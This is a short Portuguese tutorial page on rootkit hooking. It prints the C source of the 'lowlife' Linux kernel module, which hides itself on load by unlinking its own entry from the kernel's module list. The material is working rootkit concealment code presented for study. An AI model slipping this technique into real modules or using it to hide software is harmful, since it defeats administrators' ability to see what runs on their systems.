<img width="30%" src="https://i.imgur.com/ULwPfn3.png"></img>

# Hooking
Um hook, é basicamente um gancho em alguma funcionalidade de algum software<br><br>
No caso dos rootkits, esse gancho seria geralmente para ocultar alguma coisa, um exemplo disso é o [lowlife](https://github.com/wtfflya/lowlife), que faz um hook pra se esconder na lista de drivers<br><br>

# lowlife
Veja a source do driver<br><br>
```c
/* 
 * lowlife.c 
 */

#include <linux/module.h>
#include "lowlife.h" /* -- header with low_drv_hide() -- */

static int __init low_init(void)
{
  low_drv_hide(); /* -- call low_drv_hide() -- */
  printk(KERN_INFO "driver lowlife is hidden.\n");
  return 0;
}

static void __exit low_exit(void)
{
  printk(KERN_INFO "driver unloaded.\n");
}

module_init(low_init);
module_exit(low_exit);

/* 
 * lowlife.h
 */

static struct list_head *drv_prev;
void low_drv_hide(void)
{
  drv_prev = THIS_MODULE->list.prev; /* --- load list previous --- */
  list_del(&THIS_MODULE->list); /* --- remove driver from drivers list --- */
}
```
<br>
Perceba que no lowlife.h, é carregada uma list, que seria a lista de drivers do sistema, e é feito um hook para o driver se auto-deletar da list<br><br>

Para entender melhor, veja esse vídeo https://youtu.be/3npnXeOnEAw

[pwn](../README.md)<br>
[home](../../README.md)
